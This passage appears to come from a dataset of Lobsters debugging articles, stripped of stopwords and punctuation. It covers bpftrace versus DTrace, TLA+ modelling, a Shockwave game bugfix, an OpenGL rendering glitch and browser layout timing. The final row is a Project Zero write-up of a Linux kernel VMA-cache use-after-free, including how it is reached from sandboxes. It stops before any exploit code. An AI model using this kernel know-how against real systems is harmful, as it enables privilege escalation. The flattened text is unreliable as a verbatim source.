prpsargs quantize dist io genunix start save last position disk head self last args bedev args bblkno args bbcount print final report dtrace end printf n sn pid cmd printa sn dn size bpftrace print header begin printf tracing hit ctrlc endn process io start tracepoint block blockrqinsert last args dev calculate seek distance last last args dev dist args sector last args sector last last args sector store detail size pid comm hist dist tracepoint block blockrqinsert save last position disk head last args dev args sector args nrsector print final report end printf n pid comm n print size clear size clear last example show overall script similar major work porting script linux syntax research testing find equivalent linux tracepoints argument major work irrespective tracing language ported found little odd would guessed answer question disk seeking really answering tricker question application causing disk seek wrote seeksized think back time understand back could already tell disk seeking interpreting iostat output seeing high disk latency small io iostat could nt tell due competing application using disk application applying random workload wrote seeksized answer answer directs tuning whether need separate application different disk tune one application disk workload take long spoken many engineer company finishing highlevel tracer linux interesting case study linux v commercial development summary reason took long linux nt company scott mcnealy ceo sun microsystems dtrace developed fond saying wood behind one arrow much staff installed giant arrow office window april fool joke linux effort nt behind one tracing arrow split among systemtap lttng ftrace perfevents oel dtrace ktap sysdig intel pin bcc shark ply bpftrace linux company management could consolidate overlapping project focus one two tracer nt linux linux dropped ball dynamic tracing implementation dprobes creating opportunity sun develop competitive feature sun billion revenue countless staff worked making dtrace successful including sale marketing educational service etc circumstance nt exist linux linux already company offering real resource build competitive tracer one exception red hat funding went systemtap ask rhel customer dtrace may say year ago systemtap however systemtap never fully merged linux kernel part like uprobes outoftree project required maintenance work red hat rhel try complaining red hat ubuntu user often say switch rhel blame problem real money table build linux dtrace especially since red hat picked big exsun account wanted dtrace went systemtap goodenough solution another impediment goodenough solution company figured get systemtap lttng ftrace perf work well enough happy would like ebpfbccbpftrace finished sure nt going help develop already goodenough solution company happy enough using ftrace perftools bcc tool prior engineering work give reason help build something better ctfbtf dtrace built solaris already compact type format provide struct information needed linux dwarf debuginfo unlike ctf commonly installed hindered developing real dtracelike tracer recently linux release ctf technology linux bpf type format btf default install worth mentioning dtrace default install solaris really aided adoption customer nt choice imagine would take make bpftrace default install linux distros think long shot mean linux may never experience dtrace solaris area help ask distro maintainer include bpftrace plus bcc sysstat default crisis tool often used analyze system suffering urgent performance issue time install aptget update aptget install mean issue disappears chance see dtrace linux got ebpf nt make dtrace terrible tool overnight still useful os well positioned future upgrade ebpf reuse internals like provider instrumentation work already began bring ebpf bsd bpf originated may worth reassuring people invested time learning dtrace nt think time wasted hardest part using dtrace bpftrace knowing following methodology approach problem get gut complex software pressing production issue whether type quantize hist really least problem time spent debugging problem dtrace going help bpftrace well ply ply tobais waldekranz another frontend bpf like nt complete yet interesting difference bpftrace ply emits instruction directly whereas bpftrace us llvm ir api fairly difficult code ply also c whereas bpftrace c ply c kprobe sysread start tid nsecs kretprobe sysread start tid nsquantize nsecs start tid start tid nil probe active cdeactivating probe n possible ply find user embedded linux minimal environment whereas bpftrace popular large server linux note tobais currently developing many new ply feature ply ply repo nt reflected iovisor repo yet acknowledgement bpftrace created alastair robertson build upon ebpf bcc many contributor see acknowledgemets section dtrace linux post list dtrace earlier tracing work particular using bpftrace also using lot code developed alexei starovoitov ebpf brendan blanco libbpf sasha goldshtein usdt others see bcc repo library component using facebook also many engineer working bpf bcc made mature technology today bpftrace language similar dtrace well awk c nt first attempt highlevel language ebpf first shark jovi zangwei ply tobais waldekranz bpftrace alastair robertson point richard henderson developing ebpf backend systemtap thanks everyone worked technology use finally thanks netflix provide great supportive environment work contribute different technology including bpf conclusion ebpf changed landscape linux tracing since began merging kernel four year ago library tool highlevel frontend built scratch ebpf nearing completion bpftrace bpftrace give power analyze system custom detail find performance win tool complementary bcc bcc great complex tool bpftrace great ad hoc oneliners post described bpftrace compare dtrace next post focus bpftrace reading alastair first talk bpftrace tracing summit edinburgh oct get started bpftrace need newer linux kernel version newer better follow installmd repo eg ubuntu bpftrace install instruction improve package work netflix nflxbpftrace package bionic baseami become default install cool thing build bpftrace
267,Lobsters,debugging,Debugging,Debugging designs with TLA+,http://muratbuffalo.blogspot.com/2018/10/debugging-designs-with-tla.html,debugging design tla,modeling important testing production ignore accidentalbyproduct complexity tla great modeling logical clock work paxos work invariantbased reasoning take principled statebased rather operationexecutionbased view system sabbatical cosmos db microsoft globally distributed cloudnative database recently published customerfacing part model precisely defines consistency level offered cosmos db written nice experience report last year incorporating tla distributed system class pluscal learn active tla forum google group leslie lamport chime several thread blog includes many example tlapluscal modeling distributed algorithmssystems learntla provides userfriendly introduction tlapluscal lamport site includes tlapluscal resource videosbooksexamples link download toolkit,post talk model system exhaustively test modelsdesigns tla framework first part discus modeling design important beneficial second part explain tla suitable framework modeling especially distributed concurrent system modeling important worked large software system know prone corner case failed assumption race condition cascading fault many corner case many parameter interfere unanticipated way corner case violate seemingly reasonable implicit assumption system component environment eg faster faster process work rate abundant race condition today rise soa cloud microservices system distributed system code supposedly atomic block execution fails due process executing concurrently finally fault happen effect almost always underestimated predeployment fault take system unanticipated state interleaving recovery action normal system action system may thrown even unanticipated state large software system inevitably distributed system many unknownunknowns infinite number highlyimprobable way thing go wrong human brain reasoning scale handle possibility alleviate problem industry developed tool better observability even testing production improving availability tool important indispensable time figure inherent problem design may hard expensive fix thing thought would last project end taking time production operation model design first exhaustively test debug model correctness corner case failed assumption concurrency failure catch error design time fix develop problem become costly fix modeling first extend development time contrary save time reducing futile development attempt embarking development flawed design almost always ensures implementation flawed precise correct model hand guarantee implementation model correct help avoid bigintricate problem also provides good reference testing implementation constructing precise model system give clarity thinking support development immensely modeling discover inherent complexity problem help focus attention ignore accidentalbyproduct complexity model also help communicate precisely team others avoid ambiguity natural language handwaving generalization involved finally model hand also chance gradually introduce design decision see alternative way implement design tla great modeling tla formal language describing reasoning distributed concurrent system developed dr leslie lamport turing award winner lamport important figure distributed system due logical clock work paxos work among many others last decade involved improving tla framework help make distributed system manageable tla us basic math model reason algorithm practical logic set theory temporal logic used specifying system best framework integrates model checker exhaustively test model face corner case failed assumption concurrency failure model checker try execution possible model tell execution invariant system guarantee break invariantbased reasoning tla framework promotes invariantbased reasoning prevent problem arise operational reasoning operational reasoning start happy path try figure go wrong prevent course always fall short enumeration problem scenario overlook corner case race condition cascading failure contrast invariantbased reasoning focus need go right ensure property invariant system time invariantbased reasoning take principled statebased rather operationexecutionbased view system attain invariantbased reasoning specify safety liveness property model safety property specify system allowed example time committed data present correct liveness property specify system eventually example whenever system receives request must eventually respond request word safety property concerned nothing bad happens liveness property something good eventually happens modeling tla tla framework support building model figuring invariant property two major way firstly mathbased formal language help achieve precision still working highlevel declarative statement secondly integrated model checker exhaustively debugs model face concurrency failure produce counterexample candidate invariant fail year working tla still surprised counterexample model checker spit model easy overlook scenario model checker set straight address problem improving model sometimes relaxing candidate invariant many iteration converge exhaustively debugged model guarantee invariant building tla model beneficial even system already implemented running building model learn system better figure latent failure mode correct occur production finally maintaining tla model system provides important benefit continuous development software system need extended new feature frequently extension may interfere unanticipated way system lead downtime tla model hand first add feature model catchdebug problem designlevel using modelchecker way resolve potential issue even become problem tla practical since using tla actually save time building large software system tla modeling adopted practice many software company sabbatical cosmos db microsoft globally distributed cloudnative database team using tla model replication global distribution protocol exhaustively test design correctness failure recently published customerfacing part model precisely defines consistency level offered cosmos db amazon also used tla modeling aws offering written nice experience report also report using tla modeling hardware system well last year incorporating tla distributed system class tla enables student learn concurrency invariantbased reasoning provides handson experience distributed protocol also use tla exhaustively research new distributed algorithm experience possible pick tla couple week firstly tla adopts simple statemachine approach model system system consists set variable define state system finite set assignmentsactions serf transition system one state another furthermore pluscal provides syntactic sugar tla tendency grow long due lowlevel statetransition centric syntax look cryptic people pluscal pseudocode writing algorithm higherlevel abstraction translated underlying tla specification model checking give idea pluscal example pluscal code database replica process straightforward code see nondeterministic choice construct either action model checker exhaustively test possible combination either action check certain sequence would break one safety liveness specification learn active tla forum google group leslie lamport chime several thread blog includes many example tlapluscal modeling distributed algorithmssystems learntla provides userfriendly introduction tlapluscal lamport site includes tlapluscal resource videosbooksexamples link download toolkit
268,Lobsters,debugging,Debugging,Fixing a bug in an 18 year old Shockwave game,https://mattbruv.github.io/ccsr-bugfix/,fixing bug year old shockwave game,fixing bug year old shockwave game story changing single byte cartoon cartoon summer resort fast forward year bug walking area nothing happen would sometimes prompt game dialogue appear deconstructing game director lingo decompression offzip packzip discovery funny garbage breakthrough fixing bug fix bug happen put much effort something insignificant,fixing bug year old shockwave game story changing single byte october min read felt like unearthing buried tomb finding untouched puzzle inside one would otherwise lost time without ever solved cartoon cartoon summer resortit summer year old passed grade starting summer break meant long day playing outside watching cartoon marathon booting dad window computer browse game play brand new frontier called internet cartoon network website one favorite immersive flash game designed around cartoon tv summer released series game called cartoon cartoon summer resort video gameplay first episode cartoon cartoon summer resort game topdown rpgadventure game episode played cartoon character vacation resort cartoon character episode problem solve resort must help solve interacting character findingtrading item fast forward yearsi remembered game ago nostalga trip knew play game nearly decade old hard find working link also modern browser would run ancient vulnerability prone shockwave except internet explorer may first person finally found legitimate reason use internet exploerer playing game bit thing became impossible ignore example repetitive background music play infinite loop poor collision detection bugafter discovered bug game walking area nothing happen would sometimes prompt game dialogue appear see able rent boat game travel water trying rent another boat say boat rent today travel north walk along right edge island randomly trigger text meant boat dock point sane person healthy respsect time energy would write mild annoyance remind lowbudget web game made child decade ago continue playing looking game knowledge programming found ancient bug oddly mesmerizing felt like unearthing buried tomb finding untouched puzzle inside one would otherwise lost time without ever solved fixing bug opportunity learning discovery interestingly exactly playing game offered kid poetic something unintentionally offer entirely new challenge depending look deconstructing gamein order fix bug needed figure game worked hood research learned game shockwave game made director using director project saved dir director file file similar psd file photoshop way psd file would hold nondestructive layer text information dir project save asset raw source code information aide development process director used proprietary scripting language called lingo animate scene game saved dir file would simply able open director easily see game work however game published dcr file dcr file compiled version director project mean source code compiled bytecode run shockwave platform process similar psd file flattened png image png image dcr file case smaller layer editing information meant distributed meant stuck binary blob documentation structured even figure find lowlevel bytecode look like anyone reverse engineered lingo bytecode even documented shockwave platform work information proprietary owned adobe reason release prospect figuring game worked looking pretty grim decompressionafter feeling defeated fact likely going able solve bug decided see possible way extract asset game figured might chance could find compressed data section something similar looking around found program called offzip packzip tool able search zlib data arbitrary binary file show offset extract separate file exist ran offzip dcr file amazement actually found archive exact offzipexe open input file zip data check byte zip windowbits seek offset hexoffset zip unzip size offset space info valid compressed stream found byte covering file extracted file folder started looking result dat file fff file atn file single ini file discoveriesi started ini file value font mapping table directory window mac next moved dat file size started huge one size opened hex editor looked around unintelligible data however eventually found word mixed appeared lingo identifier sifting large dat file provided clue interesting message littered throughout found likely used photoshop graphic also internal map editing tool named mapomatic wish could see looked like made also discovered name company made game funny garbage lead developer name also file name omit felt good solve mystery made game furiously trying fix nearly year later put face person likely caused agony tidbit information nice find helpful breakthroughnext looked fff file hex editor great surprise data file legible looked like map data manually extracted data prettied text editor left something look similar json array member type flor location width wshift height hshift data item name type wall visi visiobj visiact inviobj inviact cond hasobj hasact giveobj sunscreen giveact gotscreen none none none move u l r cond timea timeb message text bought sun screen plrobj plract text sunscreen today plrobj plract gotscreen critical able deduce lot game worked game expects map text event data jsonlike lingo object member entry tile block character rendered member location offset dimension editable knowing game dialoge saved file wrote quick line extract dialogue file grep text uncompressed fff awk print r dialoguetxt using file could easily search offending text also see file offending text either case bugged text first file know right message get interacting og character map bugged tile fixing bugnow open search boat string hex editor find find member object associated change property save file afterwards recompress patch back original game dcr using packzip packzip testdcr change block type patch game clearly see outline messed tile changing tile id show bound bugged area actual fix bug laughably simple change identifier message fessage bugged tile patch walk back area message fixing bug game literally editing byte fix best guess game engine probably check data tile player standing move condition pass display appropriate message message array tile changing message fessage longer reference message array code look treat empty undefined object happily display nothing consider j example function foo bar bar message undefined suppose change function foo want change outcome access data passed rename passing object message property function think never bug happen best guess happened simple oversight used map editing tool create area likely copied pasted already finished map new area tweaked would easier making scratch since text event data mixed likely overlooked spot forgot remove change make sense bugged dialogue often originates adjacent map used properly put much effort something insignificant know nostalgia
269,Lobsters,debugging,Debugging,That One Bug,https://blog.mmorpgtycoon.com/post/obsessions/,one bug,one bug test drive unlimited star war force unleashed must play whole game start cutscene near end game single sitting star war force unleashed illustration rockwell kent hunt illustration rockwell kent clue blender digital chip blender minor digression movie poster heart sea discovery illustration rockwell kent long last solution solution technical note opengl buffer management illustration james hart actual problem good book worth reading vectorstorm commit epilogue escaped alone tell thee illustration rockwell kent,one bug experienced game programmer story one bug war story tell amaze amuse impress game programmer often drink conference meetups industry equivalent fisherman one got away story one bug story time industry perhaps first one crash playstation version test drive unlimited crash would happen retail build playing burnt disc opposed running simulated file system network common console dev kit feature would happen full network session eight online player ten minute playing one newer slimline older model crashing inside middleware networking library source code bug eventually fixed switching away middleware library instead using much slower stable alternative fix make unsatisfying bug weave tale real payoff end never learned presumably never learn precisely cause crash first encounter really big inscrutible bug always remember story replaced year later crash bug track wii version star war force unleashed one made much satisfying story served well year like tdu crash one also would occur retail build running burnt disk unexciting part bug bug would happen reliably predictable moment every time followed instruction ordinarily bug easy reproduce make good war story one even though reproducible test case step test case particular playing retail build game disc must eu build game u build must playing television game language must set german must play whole game start cutscene near end game single sitting note crash occur load saved game play whole game start notice game crash particular reliable moment middle cutscene condition true abort cutscene begin point crash happens crash game continues play normally past cutscene time wanted test verify crash took qa department folk six hour speedrun game reach crash course needed modify build testing required building new disc image burning physical disc test programmer point view interesting part bug sheer amount time required order reproduce crash done development build even dev kit could attach debugger make debugging easier end took twelve hour debugging find problem consider amazingly lucky found quickly course would taken lot longer help support unsung hero qa department one eventually turned single byte uninitialised memory complicated opaque system specific combination step everything happened line exactly right single uninitialised byte would happen reliably contain value particular moment cutscene literally value byte everything would fine value would crash every single time star war force unleashed one bug story several year new story tell perhaps quite exciting star war one bug certainly bit le sexy star warslicensed product always seems perk people attention unlike bug crash even cause serious problem game tiny singleframe visual glitch unlike bug one happen unoptimised development build much full retail build seen happen window mac linux computer seen happen amd nvidia graphic card seems happen everywhere even though sound like bug boring ordinary still like story earlier story think maybe programmer bug singleframe glitch visible somewhere background mmorpg tycoon main menu pretty good capture caveat gif real glitch synthetically recreating know causing even though know caused glitch still unable trigger demand best could make happen perhaps twenty attempt luckily managed capture good one unusually good view glitch part happens flashing across almost entire screen usually would flash small area part gif captured glitch happened real would appear screen half long finally happens one frame hundred know going see glitch watch second two game would appear time per hour average glitch seemed entirely random sit stare menu hour maybe even see time lost count number time thought finally fixed bug stopped seeing discover week later still hiding back experienced game programmer facing combination extremely rare random bug report likely give sinking feeling deep pit stomach bug rare occur random often feel likely caused memory problem like reading writing subtly invalid part memory happens occasionally contain unexpected incorrect value type bug worst kind bug desperately hoping glitch sinking feeling remember note going come back topic later way expect trying failing fix bug least three year lost count number time gone hunting find fail think fixed pop day later undoubtedly longestlived bug ever found fixed one defeated time follows story hunt bug rendering glitch try assume much knowledge programming interested getting gory technical detail please feel free skip rest post important point bug finally fixed illustration rockwell kent hunt starting knew glitch seemed occur game main menu never seen happen anywhere else never heard report tester seeing anywhere else since happened suspected problem likely one object draw main menu get drawn within game surely one must something illegal somehow something bad enough corrupt single rendered frame quite bad enough trigger error message opengl knew glitch happened many different set hardware operating system assumed problem code bug particular o hardware driver assumption problem something main menu assumption problem fault spoiler one assumption wrong currently seven different visual element main menu background effect front plate grid see behind main menu gif digital line pale yellow line visible front front plate digital dotted line like digital line made dot digital solid block really giant rectangle digital line block also giant rectangle formed line digital rez block slowly appear time rezin effect digital chip stylised computer chip element type exist behind front plate supposed visible actually main menu start transition exist back behind plate rendered time even see mean could theoretically causing problem even though visible removed glitch seemed happen seemed support idea one problem although glitch happening infrequently hard certain really stopped almost every one element us special opengl shader used anything else game reason assuming one element responsible glitch possible bug shaders high list likely cause another possibility worried element type occasionally destroyed recreated main menu could tell brief glimpse glitch looked like glitch happened seeing flash element supposed behind front plate perhaps game recreating one element always get put correct place immediately perhaps next frame creation put correct spot behind plate single frame drawn front actually extremely common bug game also considered perhaps something bad happening front plate causing part always drawn suspected highly complicated shader make animated grid effect shader ability draw portion perhaps bug code led occasionally discarding bit single frame removing complexity shader make glitch go away pretty sure problem actually coming elsewhere finally also worried might rendering system getting ahead using partiallyrendered screen image input later rendering stage completely drawn perhaps reason could often see front plate partiallycomplete main screen image fed next phase rendering front plate finished drawing pretty tricky make opengl make mistake like grasping straw trying think anything could result glitch like seeing pretty well cover first three year debugging effort every week two would become obsessed one another suspicion dig deeply investigate see thing worked whether could find something done incorrectly usually think found problem glitch would hide return day week later moved thing bug quietly persisted literal year illustration rockwell kent clue would usually begin hunting glitch working gui task gui layout work test environment us digital background staring long period time likely see glitch lot frequently even still see glitch perhaps twice per day every see glitch three four time second happened would invariably trigger start another day two desperate searching cause happened start week set little obsession striving find glitch coming first time found actual source time investigating idea one digital element might problem seemed likely approach investigation time contained two new idea first changed front plate solid bright magenta theory flicker would visible drawn static bright vivid color rather animating mostlydark muted color feel like helped spot glitch lot easily second disabled digital element one instead mix six type digital element active would instead make six time many one element type would let effect run sitting staring half hour nothing except watching glitch happen digital element type flicker never went away big surprise done similar test time test anyway doublechecking result one big difference time past saw flicker would immediately move test next digital element time kept watching whole duration result time saw something never noticed digital chip enabled flicker substantially frequent testing element element seemed cause flicker something presence lot digital chip element making glitch occur far frequently otherwise never would noticed immediately moved first glitch showed digital solid block digital rez block also seemed show flickering digital line digital dotted line digital line block element though still far le digital chip knew suspect digital chip obviously suspicious thing complicated object drawn main menu one drawn six seven separate part far geometry digital element glitch worse digital chip maybe something extra draw call visual model digital element created code runtime digital chip drawn single piece test theory multiple piece factor digital chip seemed causing glitch element quickly built identical version digital chip model blender game render optimised blender model instead inefficient codebuilt model digital chip blender one change drawing chip single model data file instead collection codegenerated piece suddenly glitch almost entirely gone even gone singlepiece digital element big clue absolutely certain wherever glitch coming something drew digital chip model generated code differed drew identical digital chip model loaded file minor digression vectorstorm library slightly weird designed realistic engine sort commercial game studio used time wrote different one major way game studio want upgrade use new generation rendering technology typically create brand new engine designed entirely around new technology old engine effectively thrown away never used vectorstorm done vectorstorm library never rewritten upgraded rendering technology began simple renderer drew vector line using opengl time upgraded draw solid triangle real model using opengl mostly maintained backwardscompatibility minor adjustment game wrote even earliest version vectorstorm library would still work today modern library accomplish vectorstorm number compatibility interface provide support allow game thing supposed modern game common older one older game written still work latest engine movie poster heart sea discovery vectorstorm contains bunch utility function creating renderable geometry one function exactly sound like construct set rendering command draw filled rectangle screen noticed part digital chip created calling make bunch box different color size fine surely commonlyused function like provided vectorstorm library would something sensible right upgraded engine using opengl would upgraded commonlyused utility function thing using new bestpractices method right well turn function date back vectorstorm opengl day able store vertex data directly gpu instead embedding raw model geometry rendering command game send vectorstorm rendering engine mean unexpectedly using one vectorstorm compatibility interface old code loading model file exported tool blender hand something implemented relatively recently filebased model drawn using modern best practice would perhaps explain model could causing glitch created code causing glitch loaded file one using modern rendering one using old lessrigorously tested compatibility interface even though drawing basically data illustration rockwell kent long last solution glitch go away draw digital element using modern interface pretty clearly point compatibility interface problem need update use modern rendering command instead old compatibility one whole problem solved easy task actually work never saw glitch yay job done actual solution okay yeah satisfying end story figure actually going wrong compatibility interface something wrong much find bug find city bug lived decided simply go way avoid whole city everything inside know likely thing elsewhere game also using compatibility interface really try find problem compatibility interface fix problem rather simply writing entirely information compatibility interface receive rendering command contains embedded vertex data vectorstorm simply push explicit vertex data temporary buffer immediately sends buffer straight gpu every time receive oldstyle explicit vertex data command make effort check whether vertex data might previously sent gpu still accessible add vertex data buffer push sure fantastic performance compatibility interface meant blazingly fast need keep old code working brought date modern way thing technical note opengl buffer management try make thing efficient make temporary buffer reasonably large reuse different thing draw old compatibility interface receive rendering command containing vertex data first check space left buffer hold data write data buffer right last thing put let opengl know added data enough space left fit data buffer orphan buffer tell opengl clear start filling opengl guarantee u anything drawing data buffer orphaned still access previous data anything draw orphaning buffer access new data write really useful feature right buffer one megabyte size large enough draw thousand rectangle needing orphan start mentioned vectorstorm us rendering command system game tell engine drawing operation perform using modern rendering command drawing model created look like renderqueue setmatrix mmatrix set space renderqueue bindbuffer mbuffer set vertex data renderqueue trianglelistbuffer mindexbuffer draw triangle renderqueue cleararrays unsets vertex data renderqueue popmatrix unsets position space mbuffer mindexbuffer reference buffer data already stored gpu command executed using modern rendering system old system drawing model created worked like renderqeuue setmatrix mmatrix set space renderqueue vertexarray mvertexpositions set vertex position renderqueue texelarray mvertextexturecoordinates set vertex texture coordinate renderqueue trianglelistarray mtriangleindices draw triangle renderqueue cleararrays unsets array set renderqueue popmatrix unsets position space using explicit array data instead reference data already gpu data would go compatibility interface automatically push gpu could used trianglelistarray drawing command point explicitly old system required rendering command draw thing modern system sending different type vertex data separately instead mingling data together single buffer vertex data also required largerinmemory rendering command rendering command contain vertex data instead tiny buffer identifier tell gpu buffer asking use also worth pointing explicitly creates vertex position vertex texture coordinate data case solid box going texture applied became stuck hour pretty sure staring directly problem simply see right fact point every piece information necessary solve puzzle clue presented post remains put clue together show going precisely glitch coming programmer amongst already figured needed one big hint saw finally got unstuck reducing size buffer used compatibility layer sending vertex data gpu found smaller made buffer frequent rendering glitch became brought byte size rendering glitch became almost continuous helped see exactly going wrong illustration james hart actual problem bug way would orphan compatibility layer scratch buffer vertex data came enough space fit buffer absolutely normal correct thing since multiple blob data coming separately edge case could miss could sometimes albeit quite rarely get sequence event renderqeuue setmatrix mmatrix renderqueue vertexarray mvertexpositions vertex position fit copy gpu buffer renderqueue texelarray mvertextexturecoordinates texture coordinate nt fit orphan buffer put fresh buffer renderqueue trianglelistarray mtriangleindices draw triangle renderqueue cleararrays renderqueue popmatrix remember orphaning buffer guarantee accessibility orphaned data draw begun buffer orphaned case draw start buffer orphaned often everything happened work okay even set event happen sometimes led invalid uninitialised data present opengl looking vertex position happened saw glitch object drawing wrong size wrong position causing havoc single frame orphaned buffer storing different part vertex data fixing bug required upload vertex data gpu immediately game give u instead hold wait draw call happens case trianglelistarray point look see whether various piece vertex data going fit remaining space buffer time orphan buffer writing data way sure vertex data actually present buffer simultaneously draw call made fix even lot compatibilitymode model drawn seen glitch good book worth reading postscript remember note start blog post talked felt gut like problem invalid memory access turn exactly glitch along way ever considered code accessing bad cpu memory code telling gpu access bad gpu memory telling opengl clear data buffer going used part draw operation draw operation issued interest fix went vectorstorm commit epilogue whole story struggle bug weird way day since fixing unsettling missing constant companionship minor flicker nearby year familiar itch noticeable absence ever present still catch watching corner eye superstitious certainty tricked gone hiding wait become confident selfassured always lurking ready spring upon moment right least expect heart heart still believe one day perhaps soon see lead another merry wideranging chase code old new today task accomplish escaped alone tell thee illustration rockwell kent
270,Lobsters,debugging,Debugging,Accurately measuring layout on the web,https://nolanlawson.com/2018/09/25/accurately-measuring-layout-on-the-web/,accurately measuring layout web,update august requestpostanimationframe afterframe web rendering pipeline demo component execute javascript calculate style calculate layout render separate rendering thread naïve approach stylo engine specc ed measure performance mark various javascript timer web excellent talk event loop event loop spec edge already fixed discussion whatwg crossbrowser frame callback todd reifsteck downside alternative raf microtask raf requestidlecallback raf raf previous blog post occurs background tab may paused altogether noisy telemetry background tab fooling apis force stylelayout recalculation layout thrashing conclusion,update august technique described particular schedule event fire stylelayout calculation complete captured web api proposal called requestpostanimationframe also good polyfill called afterframe want make faster website question measure use information determine slow could made faster browser rendering pipeline complicated reason tricky measure performance webpage especially component rendered clientside everything becomes intricate ballet javascript dom styling layout rendering many folk stick understand may undermeasure completely mismeasure website frontend performance post want demystify concept offer technique accurately measuring going render thing web web rendering pipeline let say component rendered clientside using javascript keep thing simple wrote demo component vanilla j everything say would also apply react vue angular etc use handy performance profiler chrome dev tool see something like view cpu cost component term millisecond ui thread break thing step required execute javascript executing necessarily compiling javascript including state manipulation virtual dom diffing modifying dom calculate style taking cs stylesheet matching selector rule element dom also known formatting calculate layout taking cs style calculated step figuring box laid screen also known reflow render process actually putting pixel screen often involves painting compositing gpu acceleration separate rendering thread step invoke cpu cost therefore impact user experience one take long time lead appearance slowloading component naïve approach common mistake folk make trying measure process skip step entirely word measure time spent executing javascript completely ignore everything worked browser performance engineer would often look trace team website ask mark used measure done often turned mark landed right javascript style layout meaning last bit cpu work measured measure cost purpose post let focus measure style layout particular turn render step much complicated measure indeed impossible measure accurately rendering often complex interplay separate thread gpu therefore even visible userland javascript running main thread style layout calculation however measurable block main thread yes true even something like firefox stylo engine even multiple thread employed speed work ultimately main thread wait thread deliver final result way web work specc ed measure practical term want put performance mark javascript start executing another one additional work done written previously various javascript timer web help u turn requestanimationframe main tool choice problem jake archibald explains excellent talk event loop browser disagree fire callback per event loop spec requestanimationframe indeed supposed fire style layout calculated edge already fixed perhaps safari fix future well would still leave u inconsistent behavior ie well older version safari edge also anything speccompliant behavior actually make difficult measure style layout ideal world spec would two timer one requestanimationframe another requestanimationframeafterstyleandlayout something like fact discussion whatwg adding api far gleam spec author eye unfortunately live real world real constraint wait browser add timer figure crack nut even browser disagreeing requestanimationframe fire solution work crossbrowser crossbrowser frame callback solution work perfectly place callback right style layout based advice todd reifsteck believe come closest requestanimationframe settimeout performancemark end let break code case speccompliant browser chrome look like note raf fire style layout next settimeout fire step including paint case work nonspeccompliant browser edge note raf fire style layout next settimeout happens soon edge tool actually render two mark top essentially trick queue settimeout callback inside raf ensures second callback happens style layout regardless whether browser speccompliant downside alternative fair lot problem technique settimeout somewhat unpredictable may clamped case settimeout callback queued elsewhere code may last one run nonspeccompliant browser settimeout actually waste already perfectly good place set mark right inside raf however looking onesizefitsall solution browser raf settimeout close get let consider alternative approach work well raf microtask requestanimationframe promiseresolve performancemark one work microtasks eg promise run immediately javascript execution completed wait style layout raf requestidlecallback requestanimationframe requestidlecallback performancemark calling requestidlecallback inside requestanimationframe indeed capture style layout however microtask version fire early would worry one would fire late screenshot show firing fairly quickly main thread busy work ric could delayed long time waiting browser decide safe run idle work one far le sure bet settimeout raf raf requestanimationframe requestanimationframe performancemark one also called double raf perfectly fine solution compared settimeout version probably capture idle time roughly screen opposed standard settimeout therefore slightly inaccurate might wonder given already talked settimeout really firing even necessarily millisecond previous blog post keep mind even though settimeout may clamped much second occurs background tab running background tab count raf may paused altogether deal noisy telemetry background tab interesting separate question rafsettimeout despite flaw probably still better rafraf fooling case whether choose rafsettimeout double raf rest assured capturing eventloopdriven style layout cost measure place much le likely fool measuring javascript direct dom api performance example let consider would happen style layout cost invoked event loop component calling one many apis force stylelayout recalculation getboundingclientrect offsettop etc call getboundingclientrect notice style layout calculation shift middle javascript execution important point anything slower faster merely moved cost around measure full cost style layout though might deceive thinking calling getboundingclientrect slower calling fact though case robbing peter pay paul worth noting though chrome dev tool added little red triangle stylelayout calculation message forced reflow likely performance bottleneck bit misleading case cost actually higher moved earlier trace true call getboundingclientrect repeatedly change dom process might invoke layout thrashing case overall cost would indeed higher chrome dev tool right warn folk case case point easy fool measure explicit javascript execution ignore eventloopdriven style layout cost come afterward two cost may scheduled differently impact performance conclusion accurately measuring layout web hard perfect metric capture style layout indeed rendering even though three impact user experience much javascript however important understand event loop work place performance mark appropriate point component rendering lifecycle help avoid mistaken conclusion slower faster based incomplete view pipeline ensure style layout cost accounted hope blog post useful art measuring clientside performance little le mysterious maybe time push browser vendor add requestanimationframeafterstyleandlayout bikeshed name though thanks ben kelly todd reifsteck alex russell feedback draft blog post
271,Lobsters,debugging,Debugging,A cache invalidation bug in Linux memory management,https://googleprojectzero.blogspot.com/2018/09/a-cache-invalidation-bug-in-linux.html,cache invalidation bug linux memory management,,posted jann horn google project zero blogpost describes way exploit linux kernel bug exists since kernel version bug code reachable even relatively strongly sandboxed context blogpost describes way exploit environment use linux kernel nt configured increased security specifically ubuntu kernel version demonstrates kernel configuration big impact difficulty exploiting kernel bug bug report exploit filed issue tracker issue fix issue upstream stable release bug whenever userspace page fault occurs eg page paged demand linux kernel look vma virtual memory area struct vmareastruct contains fault address figure fault handled slowpath looking vma findvma walk redblack tree vmas avoid performance hit linux also fastpath bypass tree walk vma recently used implementation fastpath changed time since version linux us perthread vma cache four slot implemented mmvmacachec includelinuxvmacacheh whenever successful lookup performed slowpath vmacacheupdate store pointer vma entry array current vmacachevmas allowing next lookup use fastpath note vma cache perthread vmas associated whole process precisely struct mmstruct distinction largely ignored since nt relevant bug therefore vma freed vma cache thread must invalidated otherwise next vma lookup would follow dangling pointer however since process many thread simply iterating vma cache thread would performance problem solve struct mmstruct perthread struct vmacache tagged sequence number vma lookup fastpath discovers vmacachevalid current vmacacheseqnum current mm vmacacheseqnum nt match wipe content current thread vma cache update sequence number sequence number mmstruct vma cache bit wide meaning possible overflow ensure vma cache ca nt incorrectly appear valid current mm vmacacheseqnum actually incremented time vmacacheinvalidate helper increment current mm vmacacheseqnum special case current mm vmacacheseqnum wrapped zero would call vmacacheflushall wipe content vma cache associated current mm executing vmacacheflushall expensive would iterate every thread entire machine check struct mmstruct associated necessary flush thread vma cache version optimization added struct mmstruct associated single thread vmacacheflushall would nothing based realization every vma cache invalidation preceded vma lookup therefore singlethreaded process vma cache sequence number always close mmstruct sequence number single threaded task need iterate entire list process avoid flushing well since mm seqnum increased nt worry thread seqnum current flush occur upon next lookup atomicread mm mmusers return however optimization incorrect nt take account happens previously singlethreaded process creates new thread immediately mmstruct sequence number wrapped around zero case sequence number first thread vma cache still second thread drive mmstruct sequence number point first thread vma cache contain dangling pointer considered valid permitting use freed vma pointer first thread vma cache bug fixed changing sequence number bit thereby making overflow infeasible removing overflow handling logic reachability impact fundamentally bug triggered process run sufficiently long time overflow reference counter hour mapfixed usable ability use mmap munmap manage memory mapping clone create thread syscalls require privilege often permitted even seccompsandboxed context chrome renderer sandbox mmap munmap clone sandbox main gvisor host component docker seccomp policy make thing easy exploit us various kernel interface therefore nt work inside sandbox particular us devkmsg read dmesg log us ebpf array spam kernel page allocator usercontrolled mutable singlepage allocation however attacker willing invest time exploit 